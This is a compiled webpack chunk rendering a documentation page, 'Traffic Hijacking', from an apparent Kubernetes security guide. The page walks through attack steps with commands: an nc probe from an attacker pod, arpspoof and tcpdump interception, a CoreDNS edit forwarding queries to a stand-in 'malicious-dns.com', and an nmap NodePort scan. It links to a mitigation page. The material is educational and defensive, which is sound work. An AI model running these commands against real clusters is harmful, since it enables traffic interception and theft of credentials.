"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[3077],{2873:(e,t,i)=>{i.r(t),i.d(t,{assets:()=>o,contentTitle:()=>c,default:()=>p,frontMatter:()=>a,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"attack_vectors/traffic_hijacking","title":"Traffic Hijacking","description":"How attackers manipulate Kubernetes network traffic to intercept, redirect, or disrupt communication between workloads.","source":"@site/docs/attack_vectors/traffic_hijacking.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/traffic_hijacking","permalink":"/docs/attack_vectors/traffic_hijacking","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/traffic_hijacking.md","tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1742774115000,"sidebarPosition":11,"frontMatter":{"sidebar_position":11,"title":"Traffic Hijacking","description":"How attackers manipulate Kubernetes network traffic to intercept, redirect, or disrupt communication between workloads."},"sidebar":"default","previous":{"title":"Unrestricted HostPath Mounts","permalink":"/docs/attack_vectors/unrestricted_hostpath_mounts"},"next":{"title":"Insecure CSI Drivers","permalink":"/docs/attack_vectors/insecure_csi_drivers"}}');var r=i(4848),s=i(8453);const a={sidebar_position:11,title:"Traffic Hijacking",description:"How attackers manipulate Kubernetes network traffic to intercept, redirect, or disrupt communication between workloads."},c="Traffic Hijacking",o={},l=[{value:"Exploitation Steps: Manipulating Kubernetes Network Traffic",id:"exploitation-steps-manipulating-kubernetes-network-traffic",level:2},{value:"1. Exploit Missing Network Policies",id:"1-exploit-missing-network-policies",level:3},{value:"2. Perform Man-in-the-Middle (MITM) Attack",id:"2-perform-man-in-the-middle-mitm-attack",level:3},{value:"3. Manipulate DNS with Compromised CoreDNS",id:"3-manipulate-dns-with-compromised-coredns",level:3},{value:"4. Abuse Insecure External Service Exposure",id:"4-abuse-insecure-external-service-exposure",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2}];function d(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(t.header,{children:(0,r.jsx)(t.h1,{id:"traffic-hijacking",children:"Traffic Hijacking"})}),"\n",(0,r.jsxs)(t.p,{children:["Traffic hijacking in Kubernetes occurs when an attacker intercepts or redirects network communication between workloads. This enables ",(0,r.jsx)(t.strong,{children:"data theft, service disruption, and man-in-the-middle (MITM) attacks"}),", especially in environments lacking network segmentation and traffic encryption."]}),"\n",(0,r.jsx)(t.hr,{}),"\n",(0,r.jsx)(t.h2,{id:"exploitation-steps-manipulating-kubernetes-network-traffic",children:"Exploitation Steps: Manipulating Kubernetes Network Traffic"}),"\n",(0,r.jsxs)(t.p,{children:["An attacker exploits ",(0,r.jsx)(t.strong,{children:"missing network policies, insecure service exposure, or DNS misconfigurations"})," to hijack traffic within the cluster."]}),"\n",(0,r.jsx)(t.h3,{id:"1-exploit-missing-network-policies",children:"1. Exploit Missing Network Policies"}),"\n",(0,r.jsx)(t.p,{children:"The attacker checks if restrictive network policies are in place:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"kubectl get networkpolicies --all-namespaces\n"})}),"\n",(0,r.jsx)(t.p,{children:"If none exist, they attempt lateral movement from a compromised pod:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"kubectl run attacker-pod --rm -it --image=alpine -- /bin/sh\nnc -zv <target-pod-ip> 443\n"})}),"\n",(0,r.jsx)(t.p,{children:"Without network segmentation, pods can communicate freely, enabling reconnaissance and access to sensitive services."}),"\n",(0,r.jsx)(t.hr,{}),"\n",(0,r.jsx)(t.h3,{id:"2-perform-man-in-the-middle-mitm-attack",children:"2. Perform Man-in-the-Middle (MITM) Attack"}),"\n",(0,r.jsx)(t.p,{children:"From within a compromised pod, the attacker intercepts traffic using ARP spoofing:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"arpspoof -i eth0 -t <victim-ip> <gateway-ip>\n"})}),"\n",(0,r.jsx)(t.p,{children:"Or captures unencrypted data with:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"tcpdump -i eth0 -A port 443\n"})}),"\n",(0,r.jsx)(t.p,{children:"This allows them to steal session data, secrets, or API credentials."}),"\n",(0,r.jsx)(t.hr,{}),"\n",(0,r.jsx)(t.h3,{id:"3-manipulate-dns-with-compromised-coredns",children:"3. Manipulate DNS with Compromised CoreDNS"}),"\n",(0,r.jsxs)(t.p,{children:["If ",(0,r.jsx)(t.strong,{children:"CoreDNS"})," is misconfigured or lacks validation, the attacker injects rogue entries:"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"kubectl edit configmap coredns -n kube-system\n"})}),"\n",(0,r.jsx)(t.p,{children:"Example modification:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-yaml",children:".:53 {\nforward . malicious-dns.com\n}\n"})}),"\n",(0,r.jsx)(t.p,{children:"All DNS traffic is now redirected to attacker-controlled servers, enabling traffic rerouting or phishing."}),"\n",(0,r.jsx)(t.hr,{}),"\n",(0,r.jsx)(t.h3,{id:"4-abuse-insecure-external-service-exposure",children:"4. Abuse Insecure External Service Exposure"}),"\n",(0,r.jsx)(t.p,{children:"If services are exposed using NodePort or LoadBalancer without proper controls, the attacker scans for open ports:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"nmap -p 30000-32767 <cluster-node-ip>\n"})}),"\n",(0,r.jsx)(t.p,{children:"Once found, they can access backend services without authentication and extract sensitive data directly."}),"\n",(0,r.jsx)(t.hr,{}),"\n",(0,r.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,r.jsx)(t.p,{children:"The attacker successfully intercepts or manipulates network traffic, leading to:"}),"\n",(0,r.jsxs)(t.ul,{children:["\n",(0,r.jsx)(t.li,{children:(0,r.jsx)(t.strong,{children:"Unauthorized access to services and data"})}),"\n",(0,r.jsx)(t.li,{children:(0,r.jsx)(t.strong,{children:"Intra-cluster lateral movement"})}),"\n",(0,r.jsx)(t.li,{children:(0,r.jsx)(t.strong,{children:"Disrupted communications and workload instability"})}),"\n"]}),"\n",(0,r.jsx)(t.hr,{}),"\n",(0,r.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,r.jsxs)(t.p,{children:["\u27a1 ",(0,r.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/network_security/traffic_hijacking_mitigation",children:"Securing Kubernetes Network Traffic"})]})]})}function p(e={}){const{wrapper:t}={...(0,s.R)(),...e.components};return t?(0,r.jsx)(t,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,t,i)=>{i.d(t,{R:()=>a,x:()=>c});var n=i(6540);const r={},s=n.createContext(r);function a(e){const t=n.useContext(s);return n.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),n.createElement(s.Provider,{value:t},e.children)}}}]);